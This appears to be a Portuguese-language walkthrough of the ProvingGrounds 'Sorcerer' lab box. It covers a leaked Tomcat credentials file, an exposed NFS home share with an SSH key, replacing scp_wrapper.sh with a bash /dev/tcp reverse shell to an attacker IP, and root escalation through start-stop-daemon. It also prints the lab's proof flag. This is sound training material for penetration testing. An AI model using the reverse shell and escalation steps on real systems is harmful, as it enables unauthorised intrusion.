---
title: "ProvingGrounds - Sorcerer"
author: mithr4nd1r
date: 2022-12-14 11:00:00 -0300
categories: [Walkthrough, ProvingGrounds]
tags: [writeup, walkthrough, provinggrounds, oscp, pentest, ctf, linux, medium, tomcat, ssh, scp-wrapper, start-stop-daemon]
pin: false
---

> **Dificuldade**: Médio (opinião: fácil)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## 1. Escaneamento

```
Nmap scan report for 192.168.160.100
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp    open  http     nginx
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx (title: SORCERER)
8080/tcp  open  http     Apache Tomcat 7.0.4
```

## 2. Enumeração

### Web (7742) — directory bruteforce

```bash
dirsearch -r -u http://192.168.160.100:7742 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -e txt,php -f
```

Encontrados:
- `/default/` → conteúdo limitado
- `/zipfiles/` → arquivo `tomcat-users.xml.bak`

### Tomcat creds (porta 8080)

`tomcat-users.xml.bak` exposto via web:

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
```

### NFS share (porta 2049)

```bash
showmount -e 192.168.160.100
mount -t nfs 192.168.160.100:/home/max /mnt/max
```

Diretório home do user `max` exposto via NFS — chave SSH privada (`id_rsa`) e `scp_wrapper.sh` legíveis.

### scp_wrapper.sh

```bash
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
  'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
  *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

Tentativa SSH normal retorna "ACCESS DENIED" — script bloqueia comandos diferentes de `scp`.

## 3. Acesso Inicial

**Insight chave**: como o NFS expõe `/home/max` com escrita, e o `scp_wrapper.sh` é executado a cada conexão SSH, basta substituir o wrapper por um shell reverso e disparar a conexão SSH para executá-lo.

```bash
# Sobrescrever scp_wrapper.sh com reverse shell
cat > scp_wrapper.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.X/9001 0>&1
EOF

# Upload via SCP (que ainda é permitido)
scp -i id_rsa scp_wrapper.sh max@192.168.160.100:/home/max/scp_wrapper.sh

# Disparar conexão SSH para executar o wrapper malicioso
ssh -i id_rsa max@192.168.160.100
```

Shell reverso como `max` recebido.

## 4. Pós-Exploração

Enumeração padrão de privesc (linpeas / sudo -l / SUID).

## 5. Escalação de Privilégio

Binário com privilégio incomum: `start-stop-daemon`. Pode executar processos com flag `-p` para preservar permissões.

```bash
start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

Como o processo é spawnado por mecanismo que herda root, obtém-se shell root:

```bash
# uid=0(root) gid=0(root)
cat /root/proof.txt
# d5d05d69180861c2b7a98eec5ce275c1
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap full ports, NFS mount, web dir bruteforce |
| Info Leak | tomcat-users.xml.bak via /zipfiles/ no nginx 7742 |
| Foothold | NFS share `/home/max` permite escrita → substituir scp_wrapper.sh |
| Initial Access | ssh dispara wrapper modificado → reverse shell |
| PrivEsc | start-stop-daemon → spawn shell `/bin/sh -- -p` → root |
